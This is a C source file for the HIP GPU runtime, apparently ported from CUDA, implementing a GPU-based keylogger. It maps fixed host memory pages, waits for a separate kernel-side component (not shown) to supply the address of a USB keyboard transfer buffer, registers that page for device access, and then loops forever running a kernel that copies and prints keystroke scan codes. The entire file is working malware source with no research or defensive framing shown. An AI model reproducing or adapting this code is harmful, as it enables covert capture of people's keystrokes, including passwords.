#include "hip/hip_runtime.h"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <hip/hip_runtime.h>

#define WRITE_PAGE	0x40000000
#define SEND_BUFFER	0x50000000

__global__ void keylogger(unsigned long *A, unsigned long *B)
{
	B[0] = A[0];
}
int main(void)
{
	int i,offset;
	hipError_t err = hipSuccess;
	unsigned long *u_keybd_buf,*u_scan_buf;
	unsigned long *scan_buf,*keybd_buf;
	unsigned long *p, *p2;
	
	hipSetDeviceFlags(hipDeviceMapHost);
	hipHostAlloc((void **)&scan_buf, 0x1000, hipHostMallocMapped);

	// Allocat memory
	p = (unsigned long *)mmap((void *)WRITE_PAGE,0x1000,PROT_READ|PROT_WRITE,MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED,-1,NULL);  // modify page table
	p2 = (unsigned long *)mmap((void *)SEND_BUFFER,0x1000,PROT_READ|PROT_WRITE,MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED,-1,NULL);  // transfer_buffer

	// remove dummy data in memory (1)
	for( i = 0; i < 0x200; i++ ){
		p[i] = 0x7777777777777777;
		p2[i] = 0x7777777777777777;
	}
	
	// Wait until the kernel writes a urbp->transfer_buffer to this address.
	memset( p2, 0, 0x1000 );
	while( p2[0] == 0 ){
		usleep( 500000 );
	}
	
	// When a value is returned from the kernel, urbp->transfer_buffer stored in p2[0].
	printf("transfer_buffer : %llX\n", p2[0] );
	offset = p2[0] & 0xfff;
	// This mean is that p2 is not exist in host process memory.
	munmap(p2, 0x1000);

	// Allocate memory on the device.
	hipMalloc(&u_scan_buf,512);	
	// Registers an existing host memory range for use by CUDA.
	hipHostRegister((void *)WRITE_PAGE, 0x1000, hipHostRegisterMapped);	
	
	// Passes back device pointer of mapped host memory allocated by hipHostAlloc or registered by hipHostRegister.
	hipHostGetDevicePointer((void **)&u_keybd_buf,(void *)(WRITE_PAGE+offset),0);	// hipHostGetDevicePointer ( void** pDevice, void* pHost, unsigned int  flags )
	
	// This mean is that p(keyboard_buffer) is not exist in host process memory.
	munmap(p, 0x1000);

	// Finally, Capturing Keystrokes
	while(1){
		keylogger<<<1, 1>>>(u_keybd_buf, u_scan_buf);
		hipDeviceSynchronize();
		err = hipGetLastError();
		if (err != hipSuccess){
	        	printf("Failed (error : %s)!\n", hipGetErrorString(err));
	        	exit(EXIT_FAILURE);
    		}
		// Copies data between host and device.
		hipMemcpy(scan_buf,u_scan_buf,8,hipMemcpyDeviceToHost);
		printf("%llX\n",scan_buf[0]);
		usleep(80000);
	}
	hipDeviceReset();
	return 0;
}

